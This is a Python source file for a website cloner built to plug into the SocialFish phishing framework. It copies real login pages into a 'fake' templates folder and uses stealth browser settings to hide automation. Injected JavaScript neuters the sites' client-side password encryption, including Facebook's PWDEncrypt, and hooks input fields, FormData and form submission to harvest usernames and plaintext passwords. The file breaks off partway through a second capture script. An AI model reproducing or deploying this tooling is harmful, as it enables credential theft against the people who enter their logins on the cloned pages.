
#!/usr/bin/env python3
"""
SocialFish Compatible UNIVERSAL Website Cloner - FINAL VERSION WITH PASSWORD CAPTURE
Integrates perfectly with existing SocialFish Flask application
Supports ALL modern websites with advanced stealth and universal compatibility
FIXED: CSS background-image URL rewriting for proper display
ENHANCED: Password capture in plain text before encryption
"""

import asyncio
import aiohttp
import aiofiles
import json
import re
import os
import time
import random
import hashlib
import mimetypes
import base64
import zlib
import gzip
import brotli
import logging
import threading
import queue
from pathlib import Path
from dataclasses import dataclass, field
from typing import Dict, List, Set, Optional, Tuple, Any, Union
from collections import defaultdict, deque
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib.parse
import requests  # Add this import at the top
from functools import wraps
import tempfile
import shutil

# Enhanced imports with fallbacks
try:
    from bs4 import BeautifulSoup, Comment
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False
    print("⚠️ BeautifulSoup not available - using regex fallback")

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options as ChromeOptions
    from selenium.webdriver.firefox.options import Options as FirefoxOptions
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.common.action_chains import ActionChains
    from selenium.webdriver.common.keys import Keys
    from selenium.common.exceptions import TimeoutException, WebDriverException
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False
    print("⚠️ Selenium not available - using requests only")

try:
    import undetected_chromedriver as uc
    UC_AVAILABLE = True
except ImportError:
    UC_AVAILABLE = False

try:
    from playwright.async_api import async_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

# Suppress warnings
try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    pass
logging.getLogger('urllib3').setLevel(logging.WARNING)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('socialfish_cloner.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class SocialFishConfig:
    """Configuration optimized for SocialFish integration"""
    def __init__(self):
        # Performance settings
        self.max_workers = 6
        self.max_concurrent_downloads = 12
        self.request_timeout = 30
        self.page_load_timeout = 45
        
        # Stealth settings
        self.rotate_user_agents = True
        self.mimic_human_behavior = True
        self.use_undetected_chrome = UC_AVAILABLE
        
        # Resource handling
        self.download_images = True
        self.download_fonts = True
        self.download_css = True
        self.download_js = True
        self.process_inline_resources = True
        self.rewrite_urls = True
        
        # Advanced features
        self.render_spa = True
        self.handle_auth_flows = True
        self.capture_api_calls = True
        
        # PASSWORD CAPTURE SETTINGS - NEW
        self.capture_passwords_plaintext = True
        self.disable_client_encryption = True
        self.log_password_attempts = True
        self.save_captured_passwords = True
        
        # Error handling
        self.max_retries = 3
        self.retry_delay = 1.0
        self.ignore_ssl_errors = True
        
        # SocialFish specific
        self.output_base = 'templates/fake'
        self.create_index_html = True

class AdvancedUserAgentManager:
    """Advanced user agent management with realistic fingerprints"""
    
    def __init__(self):
        self.agents = self._load_comprehensive_agents()
        self.current_index = 0
    
    def _load_comprehensive_agents(self):
        """Load comprehensive user agent database"""
        return [
            {
                'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
                'platform': 'Windows',
                'browser': 'Chrome',
                'mobile': False,
                'headers': {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br, zstd',
                    'Sec-Ch-Ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
                    'Sec-Ch-Ua-Mobile': '?0',
                    'Sec-Ch-Ua-Platform': '"Windows"',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'none',
                    'Sec-Fetch-User': '?1'
                }
            },
            {
                'ua': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
                'platform': 'macOS',
                'browser': 'Chrome',
                'mobile': False,
                'headers': {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br, zstd',
                    'Sec-Ch-Ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
                    'Sec-Ch-Ua-Mobile': '?0',
                    'Sec-Ch-Ua-Platform': '"macOS"'
                }
            },
            {
                'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
                'platform': 'Windows',
                'browser': 'Firefox',
                'mobile': False,
                'headers': {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate, br'
                }
            },
            {
                'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
                'platform': 'iOS',
                'browser': 'Safari',
                'mobile': True,
                'headers': {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br'
                }
            }
        ]
    
    def get_agent_for_user_agent(self, user_agent_string):
        """Get agent data for specific user agent string"""
        # Find matching agent or use first as fallback
        for agent in self.agents:
            if agent['ua'] == user_agent_string:
                return agent
        
        # Create dynamic entry for custom UA
        return {
            'ua': user_agent_string,
            'platform': 'Unknown',
            'browser': 'Unknown',
            'mobile': 'Mobile' in user_agent_string,
            'headers': {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br'
            }
        }

class SocialFishResourceManager:
    """Resource manager optimized for SocialFish directory structure"""
    
    def __init__(self, config: SocialFishConfig):
        self.config = config
        self.session_pool = []
        self.stats = {
            'downloaded': 0,
            'failed': 0,
            'bytes_downloaded': 0,
            'processing_time': 0
        }
        self.downloaded_urls = set()
        self.failed_urls = set()
        # CRITICAL FIX: Track URL mappings for rewriting
        self.url_mappings = {}
    
    async def initialize_sessions(self, user_agent_data):
        """Initialize HTTP sessions"""
        self.session_pool = []
        
        for i in range(3):  # Create 3 sessions
            timeout = aiohttp.ClientTimeout(total=self.config.request_timeout)
            connector = aiohttp.TCPConnector(
                limit=50,
                limit_per_host=10,
                ssl=not self.config.ignore_ssl_errors,
                ttl_dns_cache=300
            )
            
            headers = dict(user_agent_data['headers'])
            headers['User-Agent'] = user_agent_data['ua']
            
            session = aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                headers=headers
            )
            
            self.session_pool.append(session)
    
    async def download_resource(self, url: str, resource_type: str, 
                               referer: str = None) -> Optional[Tuple[bytes, Dict[str, Any]]]:
        """Download resource using SYNC requests in async wrapper - BULLETPROOF"""
        if url in self.downloaded_urls or url in self.failed_urls:
            return None
        
        # Run the EXACT working code pattern in a thread
        import concurrent.futures
        import threading
        
        def sync_download():
            """EXACT copy of working code download pattern"""
            try:
                # Create session exactly like working code
                session = requests.Session()
                session.verify = False
                session.timeout = 30
                
                # Headers like working code
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                    'Accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8' if resource_type == 'image' else '*/*',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                }
                
                if referer:
                    headers['Referer'] = referer
                
                # EXACT working code request
                response = session.get(url, headers=headers, timeout=30, verify=False)
                
                if response.status_code == 200:
                    # EXACT working code content handling
                    content = response.content  # Raw bytes - this is what works!
                    
                    # EXACT working code decompression
                    encoding = response.headers.get('content-encoding', '').lower()
                    
                    if 'br' in encoding:
                        try:
                            content = brotli.decompress(content)
                        except:
                            pass
                    elif 'gzip' in encoding:
                        try:
                            content = gzip.decompress(content)
                        except:
                            pass
                    elif 'deflate' in encoding:
                        try:
                            content = zlib.decompress(content)
                        except:
                            pass
                    
                    return content, {
                        'url': url,
                        'content_type': response.headers.get('content-type', ''),
                        'size': len(content),
                        'status': response.status_code
                    }
                
                return None
                
            except Exception as e:
                print(f"Download failed: {e}")
                return None
        
        # Run in thread to avoid blocking async loop
        loop = asyncio.get_event_loop()
        with concurrent.futures.ThreadPoolExecutor() as executor:
            future = executor.submit(sync_download)
            try:
                result = await loop.run_in_executor(None, sync_download)
                
                if result:
                    content, metadata = result
                    self.downloaded_urls.add(url)
                    self.stats['downloaded'] += 1
                    self.stats['bytes_downloaded'] += len(content)
                    return content, metadata
                else:
                    self.failed_urls.add(url)
                    self.stats['failed'] += 1
                    return None
                    
            except Exception as e:
                logger.error(f"Thread execution failed: {e}")
                self.failed_urls.add(url)
                self.stats['failed'] += 1
                return None
    
    async def cleanup(self):
        """Cleanup sessions"""
        for session in self.session_pool:
            await session.close()

class SocialFishBrowserManager:
    """Browser manager with advanced stealth and PASSWORD CAPTURE for SocialFish"""
    
    def __init__(self, config: SocialFishConfig):
        self.config = config
        self.driver = None
        self.captured_passwords = []  # NEW: Store captured passwords
        self.password_capture_enabled = config.capture_passwords_plaintext
    
    def initialize_browser(self, user_agent: str):
        """Initialize browser with advanced stealth and password capture"""
        try:
            if self.config.use_undetected_chrome and UC_AVAILABLE:
                return self._create_undetected_chrome(user_agent)
            elif SELENIUM_AVAILABLE:
                return self._create_selenium_browser(user_agent)
        except Exception as e:
            logger.warning(f"Browser initialization failed: {e}")
        
        return None
    
    def _create_undetected_chrome(self, user_agent: str):
        """Create undetected Chrome instance"""
        try:
            options = uc.ChromeOptions()
            
            stealth_args = [
                '--no-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--window-size=1920,1080',
                f'--user-agent={user_agent}',
                '--disable-blink-features=AutomationControlled',
                '--disable-web-security',
                '--no-first-run'
            ]
            
            for arg in stealth_args:
                options.add_argument(arg)
            
            options.add_experimental_option('excludeSwitches', ['enable-automation'])
            options.add_experimental_option('useAutomationExtension', False)
            
            driver = uc.Chrome(options=options)
            
            # Additional stealth
            driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            driver.execute_cdp_cmd('Network.setUserAgentOverride', {"userAgent": user_agent})
            
            return driver
            
        except Exception as e:
            logger.error(f"Undetected Chrome creation failed: {e}")
            return None
    
    def _create_selenium_browser(self, user_agent: str):
        """Create regular Selenium browser"""
        try:
            # Try Chrome first
            options = ChromeOptions()
            options.add_argument('--headless')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument(f'--user-agent={user_agent}')
            options.add_argument('--disable-blink-features=AutomationControlled')
            options.add_experimental_option('excludeSwitches', ['enable-automation'])
            
            driver = webdriver.Chrome(options=options)
            driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            return driver
            
        except Exception:
            # Fallback to Firefox
            try:
                options = FirefoxOptions()
                options.add_argument('--headless')
                options.set_preference('general.useragent.override', user_agent)
                options.set_preference('dom.webdriver.enabled', False)
                
                return webdriver.Firefox(options=options)
                
            except Exception as e:
                logger.error(f"Firefox creation failed: {e}")
                return None
    
    async def render_page(self, url: str) -> Optional[str]:
        """Render page with JavaScript execution and NUCLEAR PASSWORD CAPTURE"""
        if not self.driver:
            return None
        
        try:
            self.driver.set_page_load_timeout(self.config.page_load_timeout)
            
            # NUCLEAR OPTION: Inject scripts BEFORE page navigation
            self._inject_nuclear_password_capture()
            
            self.driver.get(url)
            
            # Wait for page load
            WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )
            
            # CRITICAL: Re-inject immediately after page load
            self._inject_nuclear_password_capture()
            
            # Simulate human behavior
            if self.config.mimic_human_behavior:
                await self._simulate_human_behavior()
            
            # Trigger lazy loading
            self.driver.execute_script("""
                window.scrollTo(0, document.body.scrollHeight);
                
                // Trigger intersection observers
                document.querySelectorAll('img[data-src]').forEach(img => {
                    if (img.dataset.src) {
                        img.src = img.dataset.src;
                    }
                });
                
                // Dispatch load event
                window.dispatchEvent(new Event('load'));
            """)
            
            await asyncio.sleep(2)
            
            # FINAL: One more injection to catch any late loaders
            self._inject_nuclear_password_capture()
            
            return self.driver.page_source
            
        except Exception as e:
            logger.error(f"Page rendering failed: {e}")
            return None
    
    def _inject_nuclear_password_capture(self):
        """NUCLEAR OPTION: The most aggressive password capture possible"""
        nuclear_script = '''
        (function() {
            console.log("💥 NUCLEAR PASSWORD CAPTURE ACTIVATED");
            
            // STEP 0: IMMEDIATE GLOBAL LOCKDOWN
            window.socialfishCapturedData = window.socialfishCapturedData || {
                passwords: [], usernames: [], formData: {}, 
                blocked_encryptions: [], raw_passwords: []
            };
            
            // NUCLEAR OPTION 1: KILL ALL POSSIBLE ENCRYPTION FUNCTIONS
            const nuclearKill = (funcName) => {
                try {
                    Object.defineProperty(window, funcName, {
                        get: function() {
                            return function(password) {
                                console.log(`💥 NUCLEAR KILL ${funcName} - RAW PASSWORD:`, password);
                                window.socialfishCapturedData.raw_passwords.push({
                                    function: funcName,
                                    password: password,
                                    timestamp: Date.now(),
                                    source: 'nuclear-kill'
                                });
                                return password; // ALWAYS return unencrypted
                            };
                        },
                        set: function(value) {
                            console.log(`💥 BLOCKED SETTING ${funcName}`);
                            return function(password) {
                                console.log(`💥 NUCLEAR INTERCEPT ${funcName} - RAW PASSWORD:`, password);
                                window.socialfishCapturedData.raw_passwords.push({
                                    function: funcName + '_set',
                                    password: password,
                                    timestamp: Date.now(),
                                    source: 'nuclear-set-block'
                                });
                                return password;
                            };
                        },
                        configurable: false,
                        enumerable: false
                    });
                } catch (e) {
                    console.log(`Failed to kill ${funcName}:`, e);
                }
            };
            
            // Kill every possible encryption function name
            const encryptionFunctions = [
                'PWDEncrypt', 'encryptPassword', 'hashPassword', '_encrypt', 
                'passwordEncrypt', 'cryptPassword', 'hashPwd', 'encryptPwd',
                'encrypt', 'hash', 'encode', 'obfuscate', 'scramble',
                'PWD_encrypt', 'pwd_encrypt', 'password_encrypt', 'pass_encrypt'
            ];
            
            encryptionFunctions.forEach(nuclearKill);
            
            // NUCLEAR OPTION 2: KILL MODULE SYSTEMS COMPLETELY
            try {
                Object.defineProperty(window, '__d', {
                    get: () => (() => null),
                    set: () => {},
                    configurable: false
                });
            } catch (e) {}
            
            try {
                Object.defineProperty(window, 'require', {
                    get: () => (() => ({encrypt: p => p, hash: p => p})),
                    set: () => {},
                    configurable: false
                });
            } catch (e) {}
            
            // NUCLEAR OPTION 3: OVERRIDE ALL ENCODING FUNCTIONS
            const originalBtoa = window.btoa;
            const originalAtob = window.atob;
            
            try {
                window.btoa = function(str) {
                    console.log("💥 NUCLEAR btoa intercept:", str);
                    if (str && str.length > 4 && str.length < 200) {
                        window.socialfishCapturedData.raw_passwords.push({
                            function: 'btoa',
                            password: str,
                            timestamp: Date.now(),
                            source: 'nuclear-btoa'
                        });
                    }
                    return originalBtoa ? originalBtoa(str) : btoa(str);
                };
            } catch (e) {}
            
            // NUCLEAR OPTION 4: INTERCEPT ALL FORM DATA CREATION WITH PASSWORD PRESERVATION
            const originalFormData = window.FormData;
            try {
                window.FormData = function(form) {
                    console.log("💥 NUCLEAR FormData intercept");
                    const formData = new originalFormData(form);
                    
                    if (form) {
                        // CRITICAL: Get passwords from our permanent storage
                        const inputs = form.querySelectorAll('input');
                        inputs.forEach(input => {
                            const name = input.name || input.id || 'unknown';
                            const value = input.value;
                            const type = input.type || 'text';
                            
                            // Check our permanent storage for password values
                            if (window.nuclearPasswordStorage && window.nuclearPasswordStorage.has(input)) {
                                const storedPassword = window.nuclearPasswordStorage.get(input);
                                console.log(`💥 NUCLEAR FORM USING STORED PASSWORD - ${name}:`, storedPassword);
                                
                                // Replace empty password with stored value
                                if ((type === 'password' || /pass|pwd/i.test(name)) && storedPassword) {
                                    // Override the FormData with our stored password
                                    formData.set(name, storedPassword);
                                    
                                    window.socialfishCapturedData.raw_passwords.push({
                                        field: name,
                                        password: storedPassword,
                                        timestamp: Date.now(),
                                        source: 'nuclear-formdata-stored'
                                    });
                                }
                            }
                            
                            if (type === 'password' || /pass|pwd/i.test(name)) {
                                console.log(`💥 NUCLEAR FORM PASSWORD - ${name}:`, value);
                                if (value) {
                                    window.socialfishCapturedData.raw_passwords.push({
                                        field: name,
                                        password: value,
                                        timestamp: Date.now(),
                                        source: 'nuclear-formdata'
                                    });
                                }
                            }
                        });
                    }
                    
                    return formData;
                };
            } catch (e) {}
            
            // NUCLEAR OPTION 5: OVERRIDE INPUT VALUE GETTERS WITH PERMANENT STORAGE
            try {
                const originalValueDescriptor = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value');
                const passwordStorage = new Map(); // Permanent password storage
                
                Object.defineProperty(HTMLInputElement.prototype, 'value', {
                    get: function() {
                        const originalValue = originalValueDescriptor.get.call(this);
                        const type = this.type || 'text';
                        const name = this.name || this.id || 'unknown';
                        
                        // If it's a password field, check our storage first
                        if ((type === 'password' || /pass|pwd/i.test(name)) && passwordStorage.has(this)) {
                            const storedValue = passwordStorage.get(this);
                            console.log(`💥 NUCLEAR INPUT VALUE GET (STORED) - ${name}:`, storedValue);
                            return storedValue;
                        }
                        
                        if ((type === 'password' || /pass|pwd/i.test(name)) && originalValue && originalValue.length > 0) {
                            console.log(`💥 NUCLEAR INPUT VALUE GET - ${name}:`, originalValue);
                            passwordStorage.set(this, originalValue); // Store it permanently
                            window.socialfishCapturedData.raw_passwords.push({
                                field: name,
                                password: originalValue,
                                timestamp: Date.now(),
                                source: 'nuclear-input-get'
                            });
                        }
                        
                        return originalValue;
                    },
                    set: function(value) {
                        const type = this.type || 'text';
                        const name = this.name || this.id || 'unknown';
                        
                        if ((type === 'password' || /pass|pwd/i.test(name)) && value && value.length > 0) {
                            console.log(`💥 NUCLEAR INPUT VALUE SET - ${name}:`, value);
                            passwordStorage.set(this, value); // Store permanently
                            window.socialfishCapturedData.raw_passwords.push({
                                field: name,
                                password: value,
                                timestamp: Date.now(),
                                source: 'nuclear-input-set'
                            });
                        }
                        
                        return originalValueDescriptor.set.call(this, value);
                    }
                });
                
                // Expose password storage for form submission
                window.nuclearPasswordStorage = passwordStorage;
            } catch (e) {
                console.log("Nuclear input override failed:", e);
            }
            
            // NUCLEAR OPTION 6: CONTINUOUS MONITORING WITH MAXIMUM FREQUENCY
            const nuclearMonitor = () => {
                try {
                    document.querySelectorAll('input').forEach(input => {
                        const type = input.type || 'text';
                        const name = (input.name || input.id || '').toLowerCase();
                        const value = input.value;
                        
                        if ((type === 'password' || name.includes('pass') || name.includes('pwd')) && 
                            value && value.length > 0 && !input._nuclearMonitored) {
                            
                            console.log(`💥 NUCLEAR MONITOR FOUND PASSWORD - ${name}:`, value);
                            window.socialfishCapturedData.raw_passwords.push({
                                field: name,
                                password: value,
                                timestamp: Date.now(),
                                source: 'nuclear-monitor'
                            });
                            
                            input._nuclearMonitored = true;
                            
                            // Add all possible event listeners
                            ['input', 'change', 'blur', 'keyup', 'keydown', 'paste'].forEach(eventType => {
                                input.addEventListener(eventType, () => {
                                    if (input.value) {
                                        console.log(`💥 NUCLEAR EVENT ${eventType} - ${name}:`, input.value);
                                        window.socialfishCapturedData.raw_passwords.push({
                                            field: name,
                                            password: input.value,
                                            timestamp: Date.now(),
                                            source: `nuclear-${eventType}`
                                        });
                                    }
                                });
                            });
                        }
                    });
                } catch (e) {}
            };
            
            // Run nuclear monitor continuously at maximum frequency
            setInterval(nuclearMonitor, 50); // Every 50ms
            
            // NUCLEAR OPTION 7: OVERRIDE FORM SUBMISSION AT ALL LEVELS WITH COMPREHENSIVE PASSWORD RECOVERY
            const nuclearFormIntercept = (form) => {
                try {
                    console.log("💥 NUCLEAR FORM SUBMISSION INTERCEPT");
                    
                    const inputs = form.querySelectorAll('input');
                    const captured = {};
                    
                    inputs.forEach(input => {
                        const name = input.name || input.id || `input_${Date.now()}`;
                        let value = input.value;
                        const type = input.type || 'text';
                        
                        // COMPREHENSIVE PASSWORD RECOVERY
                        if (type === 'password' || /pass|pwd/i.test(name)) {
                            // Try multiple sources for the password
                            let recoveredPassword = value;
                            
                            // Source 1: Global password storage
                            if (!recoveredPassword && window.globalPasswordStorage) {
                                recoveredPassword = window.globalPasswordStorage.get(name) || 
                                                  window.globalPasswordStorage.get('last_password');
                            }
                            
                            // Source 2: Nuclear password storage
                            if (!recoveredPassword && window.nuclearPasswordStorage) {
                                recoveredPassword = window.nuclearPasswordStorage.get(input);
                            }
                            
                            // Source 3: Check our capture arrays for this field
                            if (!recoveredPassword && window.socialfishCapturedData.raw_passwords.length > 0) {
                                const lastCapture = window.socialfishCapturedData.raw_passwords
                                    .filter(p => p.field === name || p.field.includes('pass'))
                                    .pop();
                                if (lastCapture) {
                                    recoveredPassword = lastCapture.password;
                                }
                            }
                            
                            // Use recovered password if found
                            if (recoveredPassword) {
                                value = recoveredPassword;
                                console.log(`💥 NUCLEAR FORM SUBMIT PASSWORD RECOVERED - ${name}:`, value);
                            } else {
                                console.log(`💥 NUCLEAR FORM SUBMIT PASSWORD EMPTY - ${name}`);
                            }
                            
                            window.socialfishCapturedData.raw_passwords.push({
                                field: name,
                                password: value,
                                timestamp: Date.now(),
                                source: 'nuclear-form-submit'
                            });
                        }
                        
                        captured[name] = value;
                        
                        if (/email|user|login/i.test(name)) {
                            window.socialfishCapturedData.usernames.push({
                                field: name,
                                value: value,
                                timestamp: Date.now(),
                                source: 'nuclear-form-submit'
                            });
                        }
                    });
                    
                    // CRITICAL: Make sure we have at least one password
                    const hasPassword = Object.keys(captured).some(key => 
                        (/pass|pwd/i.test(key) && captured[key]) || 
                        key === 'pass' || key === 'password'
                    );
                    
                    if (!hasPassword && window.globalPasswordStorage && window.globalPasswordStorage.get('last_password')) {
                        // Add the last captured password to the form
                        captured['pass'] = window.globalPasswordStorage.get('last_password');
                        console.log("💥 NUCLEAR ADDED LAST PASSWORD TO FORM:", captured['pass']);
                    }
                    
                    window.socialfishCapturedData.formData = captured;
                    console.log("💥 NUCLEAR COMPLETE FORM DATA:", captured);
                } catch (e) {}
            };
            
            // Override form submission at multiple levels
            document.addEventListener('submit', function(e) {
                nuclearFormIntercept(e.target);
            }, true);
            
            try {
                const originalSubmit = HTMLFormElement.prototype.submit;
                HTMLFormElement.prototype.submit = function() {
                    nuclearFormIntercept(this);
                    return originalSubmit.call(this);
                };
            } catch (e) {}
            
            // NUCLEAR OPTION 8: EXPOSE COMPREHENSIVE DATA ACCESS
            window.getSocialFishCapturedData = function() {
                return window.socialfishCapturedData;
            };
            
            // NUCLEAR OPTION 9: CONTINUOUS LOGGING
            setInterval(() => {
                if (window.socialfishCapturedData.raw_passwords.length > 0) {
                    console.log("💥 NUCLEAR RAW PASSWORDS CAPTURED:", window.socialfishCapturedData.raw_passwords);
                }
            }, 1000);
            
            console.log("💥 NUCLEAR PASSWORD CAPTURE SYSTEM FULLY DEPLOYED - MAXIMUM DESTRUCTION MODE!");
            
        })();
        '''
        
        try:
            self.driver.execute_script(nuclear_script)
            logger.info("💥 Nuclear password capture system deployed")
        except Exception as e:
            logger.error(f"❌ Failed to deploy nuclear password capture: {e}")
    
    def _inject_password_capture_scripts(self):
        """CRITICAL: Inject ULTRA-AGGRESSIVE password capture and encryption blocking scripts"""
        password_capture_script = '''
        (function() {
            console.log("🔑 SocialFish ULTRA Password Capture System Activated");
            
            // STEP 0: IMMEDIATE GLOBAL BLOCKING - BEFORE ANYTHING ELSE LOADS
            
            // Block ALL module loading systems immediately
            if (typeof window.__d !== 'undefined') {
                window.__d = function() { return null; };
            }
            
            // Pre-emptively define blocking functions
            window.PWDEncrypt = function(password) {
                console.log("🔑 PWDEncrypt BLOCKED - Plain password:", password);
                window.socialfishCapturedData = window.socialfishCapturedData || {passwords: []};
                window.socialfishCapturedData.passwords.push({
                    field: 'PWDEncrypt_intercepted',
                    value: password,
                    timestamp: Date.now(),
                    source: 'PWDEncrypt_block'
                });
                return password; // Return plain text
            };
            
            // Block Facebook's encryption before it loads
            Object.defineProperty(window, 'PWDEncrypt', {
                get: function() {
                    return function(password) {
                        console.log("🔑 PWDEncrypt getter BLOCKED - password:", password);
                        return password;
                    };
                },
                set: function(value) {
                    console.log("🛡️ Prevented PWDEncrypt from being set");
                    return function(password) {
                        console.log("🔑 PWDEncrypt setter BLOCKED - password:", password);
                        return password;
                    };
                },
                configurable: false
            });
            
            // Global password storage accessible from outside
            window.socialfishCapturedData = {
                passwords: [],
                usernames: [],
                formData: {},
                originalPasswords: [],
                blocked_encryptions: []
            };
            
            // STEP 1: NUCLEAR OPTION - DISABLE ALL POSSIBLE ENCRYPTION
            
            // Block crypto libraries BEFORE they can be used
            const cryptoLibs = ['CryptoJS', 'forge', 'bcrypt', 'jsencrypt', 'crypto-js', 'sjcl'];
            cryptoLibs.forEach(lib => {
                Object.defineProperty(window, lib, {
                    get: function() { 
                        console.log(`🛡️ Blocked access to ${lib}`);
                        return undefined; 
                    },
                    set: function() { 
                        console.log(`🛡️ Blocked setting of ${lib}`);
                        return undefined; 
                    },
                    configurable: false
                });
            });
            
            // Override btoa/atob AGGRESSIVELY
            const originalBtoa = window.btoa;
            const originalAtob = window.atob;
            
            window.btoa = function(str) {
                console.log("🔑 btoa called with:", str);
                if (str && str.length > 4 && str.length < 100) {
                    window.socialfishCapturedData.originalPasswords.push({
                        function: 'btoa',
                        password: str,
                        timestamp: Date.now()
                    });
                }
                return originalBtoa(str);
            };
            
            // STEP 2: INTERCEPT ALL POSSIBLE FORM SUBMISSION METHODS
            
            // Override form submission at the lowest level
            const originalFormSubmit = HTMLFormElement.prototype.submit;
            HTMLFormElement.prototype.submit = function() {
                console.log("🔑 Form.submit() intercepted");
                captureFormDataBeforeSubmission(this);
                return originalFormSubmit.call(this);
            };
            
            // Override FormData constructor
            const originalFormData = window.FormData;
            window.FormData = function(form) {
                const formData = new originalFormData(form);
                if (form) {
                    console.log("🔑 FormData constructor intercepted");
                    captureFormDataBeforeSubmission(form);
                }
                return formData;
            };
            
            // Function to capture form data
            const captureFormDataBeforeSubmission = (form) => {
                try {
                    const inputs = form.querySelectorAll('input');
                    inputs.forEach(input => {
                        const name = input.name || input.id || 'unknown';
                        const value = input.value;
                        const type = input.type || 'text';
                        
                        if (type === 'password' || /pass|pwd/i.test(name)) {
                            console.log(`🔑 FORM PASSWORD CAPTURED - ${name}:`, value);
                            window.socialfishCapturedData.passwords.push({
                                field: name,
                                value: value,
                                timestamp: Date.now(),
                                source: 'form-capture-direct'
                            });
                        }
                        
                        if (/email|user|login/i.test(name)) {
                            console.log(`👤 FORM USERNAME CAPTURED - ${name}:`, value);
                            window.socialfishCapturedData.usernames.push({
                                field: name,
                                value: value,
                                timestamp: Date.now(),
                                source: 'form-capture-direct'
                            });
                        }
                    });
                } catch (e) {
                    console.log("Error in form capture:", e);
                }
            };
            
            // STEP 3: AGGRESSIVE MODULE SYSTEM BLOCKING
            
            // Block AMD/RequireJS
            if (window.define) {
                const originalDefine = window.define;
                window.define = function(name, deps, factory) {
                    if (typeof name === 'string' && (name.includes('PWD') || name.includes('encrypt'))) {
                        console.log("🛡️ Blocked AMD module:", name);
                        return;
                    }
                    return originalDefine.apply(this, arguments);
                };
            }
            
            // Block CommonJS require
            if (window.require) {
                const originalRequire = window.require;
                window.require = function(module) {
                    if (typeof module === 'string' && (module.includes('PWD') || module.includes('encrypt'))) {
                        console.log("🛡️ Blocked require:", module);
                        return { encrypt: (p) => p, hash: (p) => p };
                    }
                    return originalRequire.apply(this, arguments);
                };
            }
            
            // STEP 4: FACEBOOK-SPECIFIC ULTRA BLOCKING
            
            // Block Facebook's module system more aggressively
            const blockFacebookModules = () => {
                // Kill __d immediately and permanently
                Object.defineProperty(window, '__d', {
                    get: function() {
                        return function(name, deps, factory) {
                            if (name && (name.includes('PWD') || name.includes('encrypt') || name.includes('crypto'))) {
                                console.log("🛡️ KILLED Facebook module:", name);
                                return null;
                            }
                            // Let other modules load normally but log them
                            console.log("📦 Facebook module loading:", name);
                            if (factory && typeof factory === 'function') {
                                try {
                                    const result = factory();
                                    if (result && typeof result.encrypt === 'function') {
                                        console.log("🛡️ Found encryption in module, blocking");
                                        result.encrypt = (p) => p;
                                    }
                                    return result;
                                } catch (e) {
                                    return null;
                                }
                            }
                            return null;
                        };
                    },
                    set: function() {
                        console.log("🛡️ Prevented __d from being overwritten");
                    },
                    configurable: false
                });
                
                // Block specific Facebook functions
                const fbFunctions = ['PWDEncrypt', 'encryptPassword', 'hashPassword', '_encrypt', 'passwordEncrypt'];
                fbFunctions.forEach(funcName => {
                    Object.defineProperty(window, funcName, {
                        get: function() {
                            return function(password) {
                                console.log(`🔑 ${funcName} INTERCEPTED - password:`, password);
                                window.socialfishCapturedData.blocked_encryptions.push({
                                    function: funcName,
                                    password: password,
                                    timestamp: Date.now()
                                });
                                return password; // Return unencrypted
                            };
                        },
                        set: function() {
                            console.log(`🛡️ Prevented ${funcName} from being set`);
                        },
